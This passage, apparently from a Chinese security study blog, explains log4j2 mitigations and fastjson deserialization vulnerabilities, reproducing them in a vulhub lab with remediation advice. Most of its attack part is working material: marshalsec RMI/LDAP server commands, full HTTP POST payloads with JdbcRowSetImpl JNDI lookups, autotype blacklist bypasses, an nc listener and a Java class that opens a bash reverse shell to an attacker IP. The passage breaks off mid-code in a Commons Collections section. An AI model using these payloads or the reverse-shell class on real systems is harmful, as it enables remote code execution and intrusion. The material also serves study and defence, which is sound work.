JndiLookup.class</p>\n<p>1、设置参数：</p>\n<p>log4j2.formatMsgNoLookups=True</p>\n<p>2、修改 JVM 参数：</p>\n<p>-Dlog4j2.formatMsgNoLookups=true</p>\n<p>3、系统环境变量：</p>\n<p>FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为 true</p>\n<p>4、禁止使用了 Log4j2 的应用所在服务器外连</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzODQyMDkzL2FydGljbGUvZGV0YWlscy8xMjIwNzQwMjA=\">(70 条消息) log4j2 漏洞_Archie_java 的博客 - CSDN 博客_log4j2 漏洞</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ub3NlYy5vcmcvaG9tZS9kZXRhaWwvNDkyMC5odG1s\">浅谈 Log4j2 漏洞 | NOSEC 安全讯息平台 - 白帽汇安全研究院</span></p>\n<h3 id=\"fastjson-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#fastjson-反序列化\">#</a> fastjson 反序列化</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2FsaWJhYmEvZmFzdGpzb24vd2lraS9RdWljay1TdGFydC1DTg==\">https://github.com/alibaba/fastjson/wiki/Quick-Start-CN</span> 1.2.76</p>\n<p>l 速度快</p>\n<p>l 使用广泛</p>\n<p>l 测试完备</p>\n<p>l 使用简单</p>\n<p>l 功能完备</p>\n<p><strong>序列化的时候，会调用成员变量的 get 方法，私有成员变量不会被序列化。</strong></p>\n<p><strong>反序列化的时候，会调用成员变量的类的构造方法，set 方法，public 修饰的成员全部自动赋值。</strong></p>\n<p>反序列化代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">JSON.parseObject() 返回实际类型对象,显示指定对象</span><br><span class=\"line\">User user1 = JSON.parseObject(serializedStr, User.class);</span><br><span class=\"line\">JSON.parse() 返回JsonObject对象，需要强制类型转换</span><br><span class=\"line\">Object obj1 =JSON.parse(serializedStr);</span><br></pre></td></tr></table></figure>\n<p>测试代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.JSON;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.alibaba.fastjson.parser.ParserConfig;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">JsonTest</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 从1.2.25开始，autotype默认关闭</span></span><br><span class=\"line\">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class=\"literal\">true</span>);</span><br><span class=\"line\">        <span class=\"comment\">// 序列化字符</span></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">serializedStr</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;&#123;\\&quot;@type\\&quot;:\\&quot;com.wuya.test.User\\&quot;,\\&quot;name\\&quot;:\\&quot;wuya\\&quot;,\\&quot;age\\&quot;:66, \\&quot;flag\\&quot;: true,\\&quot;sex\\&quot;:\\&quot;boy\\&quot;,\\&quot;address\\&quot;:\\&quot;china\\&quot;&#125;&quot;</span>;<span class=\"comment\">//</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;serializedStr=&quot;</span> + serializedStr);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n\\n&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//通过parse方法进行反序列化，返回的是一个JSONObject]</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parse(serializedStr)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj1</span> <span class=\"operator\">=</span>JSON.parse(serializedStr);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parse反序列化对象名称:&quot;</span> + obj1.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parse反序列化：&quot;</span> + obj1);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过parseObject,不指定类，返回的是一个JSONObject</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parseObject(serializedStr)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj2</span> <span class=\"operator\">=</span> JSON.parseObject(serializedStr);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化对象名称:&quot;</span> + obj2.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化:&quot;</span> + obj2);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过parseObject,指定为object.class</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parseObject(serializedStr, Object.class)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj3</span> <span class=\"operator\">=</span> JSON.parseObject(serializedStr, Object.class);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化对象名称:&quot;</span> + obj3.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化:&quot;</span> + obj3);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 通过parseObject,指定为User.class</span></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;JSON.parseObject(serializedStr, User.class)：&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">obj4</span> <span class=\"operator\">=</span> JSON.parseObject(serializedStr, User.class);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化对象名称:&quot;</span> + obj4.getClass().getName());</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;parseObject反序列化:&quot;</span> + obj4);</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;-----------------------------------------------\\n&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parse(serializedStr)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">parse反序列化对象名称:com.wuya.test.User</span><br><span class=\"line\">parse反序列化：User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parseObject(serializedStr)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">call User getAge</span><br><span class=\"line\">call User isFlag</span><br><span class=\"line\">call User getName</span><br><span class=\"line\">parseObject反序列化对象名称:com.alibaba.fastjson.JSONObject</span><br><span class=\"line\">parseObject反序列化:&#123;&quot;flag&quot;:true,&quot;sex&quot;:&quot;boy&quot;,&quot;name&quot;:&quot;wuya&quot;,&quot;age&quot;:66&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parseObject(serializedStr, Object.class)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">parseObject反序列化对象名称:com.wuya.test.User</span><br><span class=\"line\">parseObject反序列化:User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br><span class=\"line\">JSON.parseObject(serializedStr, User.class)：</span><br><span class=\"line\">call User default Constructor</span><br><span class=\"line\">call User setName</span><br><span class=\"line\">call User setAge</span><br><span class=\"line\">call User setFlag</span><br><span class=\"line\">parseObject反序列化对象名称:com.wuya.test.User</span><br><span class=\"line\">parseObject反序列化:User&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\">-----------------------------------------------</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>@ type 自省</p>\n<p>我们可以发现，在反序列化是没有类名的，可以通过自省传入类名。</p>\n<p>但不包含类名的问题是，当子类中包含接口或抽象类的时候，类型丢失</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;name=&#x27;wuya&#x27;, age=66, flag=true, sex=&#x27;boy&#x27;, address=&#x27;null&#x27;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;&quot;@type&quot;:&quot;com.wuya.test.User&quot;,&quot;age&quot;:33,&quot;flag&quot;:false,&quot;name&quot;:&quot;wuya&quot;&#125;</span><br></pre></td></tr></table></figure>\n<p>利用自省功能传入恶意类实现攻击</p>\n<p>这个 JSON 反序列化接口处，我们传入恶意的 JSON，就可以调用任意类的构造方法以及属性相关的 get，set 方法。 如果某类的相关方法里有危险的代码（如执行某个命令），我们就可以构造恶意 JSON 达到 RCE 的作用。</p>\n<p>利用类</p>\n<p>com.sun.rowset.JdbcRowSetImpl</p>\n<p>dataSourceName 支持传入一个 rmi 的源，可以实现 JNDI 注入攻击</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122144731132.png\" alt=\"image-20221122144731132\"></p>\n<h4 id=\"1214-cnvd-2017-02833\"><a class=\"markdownIt-Anchor\" href=\"#1214-cnvd-2017-02833\">#</a> 1.2.14 CNVD-2017-02833</h4>\n<p>复现</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1、vulhub启动靶场</span><br><span class=\"line\">2、Kali 用marshalsec启动LDAP/RMI服务</span><br><span class=\"line\">3、Kali 用python启动HTTP服务，存放恶意类</span><br><span class=\"line\">4、Kali 用netcat监听端口，建立反弹连接</span><br></pre></td></tr></table></figure>\n<p>切换 python 版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">配置</span><br><span class=\"line\">update-alternatives --install /usr/bin/python</span><br><span class=\"line\">python /usr/bin/python2 100</span><br><span class=\"line\">update-alternatives --install /usr/bin/python</span><br><span class=\"line\">python /usr/bin/python3 150</span><br><span class=\"line\">切换版本</span><br><span class=\"line\">update-alternatives --config python</span><br></pre></td></tr></table></figure>\n<p>配置 jre 版本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vim /etc/profile</span><br><span class=\"line\">export</span><br><span class=\"line\">JAVA_HOME=/usr/local/soft/java/jdk1.8.0_74</span><br><span class=\"line\">export PATH=$JAVA_HOME/bin:$PATH</span><br><span class=\"line\">export</span><br><span class=\"line\">CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HO</span><br><span class=\"line\">ME/lib/tools.jar</span><br><span class=\"line\">source /etc/profile</span><br></pre></td></tr></table></figure>\n<p>攻击:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">编写恶意代码LinuxTouch，编译为class</span><br><span class=\"line\">python -m http.server 8089 #python3</span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://192.168.142.132:8089/#LinuxTouch&quot; 9473</span><br></pre></td></tr></table></figure>\n<p>payload:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:8090</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 146</span><br><span class=\"line\">&#123; &quot;b&quot;: &#123; &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;rmi://192.168.142.132:9473/LinuxTouch&quot;, &quot;autoCommit&quot;: true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>原理:</p>\n<p><strong>1.JdbcRowSetImpl</strong></p>\n<p>payload 中反序列化时传入了 dataSourceName 和 autoCommit</p>\n<p>那么按照上面的反序列化过程一定会调用 setDataSourceName 和 setautoCommit</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void setDataSourceName(String dsName) throws SQLException&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">       if(getDataSourceName() != null) &#123;</span><br><span class=\"line\">          if(!getDataSourceName().equals(dsName)) &#123;</span><br><span class=\"line\">             super.setDataSourceName(dsName);</span><br><span class=\"line\">             conn = null;</span><br><span class=\"line\">             ps = null;</span><br><span class=\"line\">             rs = null;</span><br><span class=\"line\">          &#125;</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">       else &#123;</span><br><span class=\"line\">          super.setDataSourceName(dsName);</span><br><span class=\"line\">       &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure>\n<p>setautoCommit</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122153207492.png\" alt=\"image-20221122153207492\"></p>\n<p>setautoCommit 调用 connect ()，connect () 会对 dataSourceName 属性进行一个 InitialContext.lookup (dataSourceName), 从而实现 JNDI 注入。找到恶意服务器上下载代码并执行</p>\n<p>修复</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">默认不使用autotype</span><br><span class=\"line\">com.sun.rowset.jdbcRowSetlmpl被加入了黑名单</span><br></pre></td></tr></table></figure>\n<p>bypass 1</p>\n<p>所以在 autotypesupport 开启时，我们可以构造如下 payload 来 bypass</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;@type&quot;:&quot;Lcom.sun.rowset.JdbcRowSetImpl;&quot;,&quot;dataSourceName&quot;:&quot;rmi://ip:1099&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>\n<p>“至于为什么会有这种奇怪的处理，L 和；这一对字符其实是 JVM 字节码中用来表示类名的：”</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (className.<span class=\"title function_\">startsWith</span>(<span class=\"string\">&quot;L&quot;</span>) &amp;&amp; className.<span class=\"title function_\">endsWith</span>(<span class=\"string\">&quot;;&quot;</span>)) &#123;</span><br><span class=\"line\">    <span class=\"title class_\">String</span> newClassName = className.<span class=\"title function_\">substring</span>(<span class=\"number\">1</span>, className.<span class=\"title function_\">length</span>() - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">loadClass</span>(newClassName, classLoader);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>bypass2</p>\n<p>双写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;@type&quot;:&quot;LLcom.sun.rowset.JdbcRowSetImpl;;&quot;,</span><br><span class=\"line\">    &quot;dataSourceName&quot;:&quot;ldap://127.0.0.1:2357/Command8&quot;,</span><br><span class=\"line\">    &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"1247-cnvd-2017-22238\"><a class=\"markdownIt-Anchor\" href=\"#1247-cnvd-2017-22238\">#</a> 1.2.47 CNVD-2017-22238</h4>\n<p>通过反弹连接的方式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 9001</span><br><span class=\"line\">编写恶意代码LinuxRevers，编译为class</span><br><span class=\"line\">python -m http.server 8089 #python3</span><br><span class=\"line\"></span><br><span class=\"line\">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://192.168.142.132:8089/#LinuxRevers&quot; 9473</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//LinuxRevers.java</span><br><span class=\"line\">public class LinuxRevers &#123;</span><br><span class=\"line\">    static &#123;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            Runtime rt = Runtime.getRuntime();</span><br><span class=\"line\">            String[] commands = &#123;&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;bash -i &gt;&amp; /dev/tcp/192.168.142.132/9001 0&gt;&amp;1&quot;&#125;;</span><br><span class=\"line\">            Process pc = rt.exec(commands);</span><br><span class=\"line\">            pc.waitFor();</span><br><span class=\"line\">        &#125; catch (Exception e) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>payload：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST / HTTP/1.1</span><br><span class=\"line\">Host: 192.168.142.128:8090</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Content-Type: application/json</span><br><span class=\"line\">Content-Length: 268</span><br><span class=\"line\">&#123;&quot;a&quot;:&#123; &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,</span><br><span class=\"line\">&quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;ldap://192.168.142.132:9473/LinuxRevers&quot;, &quot;autoCommit&quot;:true</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 1.2.47 版本及以下的情况下，loadClass 中默认 cache 为 true，首先使用 java.lang.Class 把获取到的类缓存到 mapping 中，然后直接从缓存中获取到了 com.sun.rowset.jdbcRowSetlmpl 这个类，即可绕过黑名单。</p>\n<p>漏洞挖掘</p>\n<blockquote>\n<p>1、找到发送 JSON 序列化数据的接口</p>\n<p>2、判断是否使用 fastjon</p>\n<p>1）非法格式报错</p>\n<p>{“x”:&quot;</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221122154741767.png\" alt=\"image-20221122154741767\"></p>\n<p>2）使用 dnslog 探测</p>\n<p>{“x”:{&quot;@type&quot;:“java.net.Inet4Address” , “val”:“<span class=\"exturl\" data-url=\"aHR0cDovL3h4eC5kbnNsb2cuY24=\">xxx.dnslog.cn</span>”}}</p>\n<p>Burp 插件</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL3ppbG9uZzMwMzMvZmFzdGpzb25TY2Fu\">https://github.com/zilong3033/fastjsonScan</span></p>\n</blockquote>\n<p>修复</p>\n<blockquote>\n<p>1、升级 JDK</p>\n<p>6u211 / 7u201 / 8u191 /11.0.1</p>\n<p>2、升级 Fastjson 到最新版</p>\n<p>fastjson.parser.safeMode=true</p>\n<p>3、使用安全产品过滤非法内容</p>\n<p>4、更换其它序列化工具</p>\n<p>Jackson/Gson</p>\n</blockquote>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xOTU3MTg1\">浅析 FastJSON 反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区 - 腾讯云 (tencent.com)</span></p>\n<h3 id=\"apache-common-collections-反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#apache-common-collections-反序列化漏洞\">#</a> Apache Common Collections 反序列化漏洞</h3>\n<p>复现环境：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">jdk 1.7.0_80</span><br><span class=\"line\">IDEA Project Structrure、Settings——Javacompile等设置成java7</span><br><span class=\"line\">Apache Commons Collections ≤ 3.2.1</span><br></pre></td></tr></table></figure>\n<p>Common Collections 提供了很多新的数据结构：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Bag interface for collections that have a number of copies of each object</span><br><span class=\"line\">BidiMap interface for maps that can be looked up from value to key as well and key to value</span><br><span class=\"line\">MapIterator interface to provide simple and quick iteration over maps</span><br><span class=\"line\">Transforming decorators that alter each object as it is added to the collection</span><br><span class=\"line\">Composite collections that make multiple collections look like one</span><br><span class=\"line\">Ordered maps and sets that retain the order elements are added in, includingan LRU based map</span><br><span class=\"line\">Reference map that allows keys and/or values to be garbage collected underclose control</span><br><span class=\"line\">Many comparator implementations</span><br><span class=\"line\">Many iterator implementations</span><br><span class=\"line\">Adapter classes from array and enumerations to collections</span><br><span class=\"line\">Utilities to test or create typical set-theory properties of collections such asunion, intersection, and closure</span><br></pre></td></tr></table></figure>\n<p>反射：</p>\n<p>class 文件以 CA FE BA BE 开头</p>\n<p>在程序运行的时候动态创建一个类的实例，调用实例的方法和访问它的属性</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void test2()&#123;</span><br><span class=\"line\">        try &#123;</span><br><span 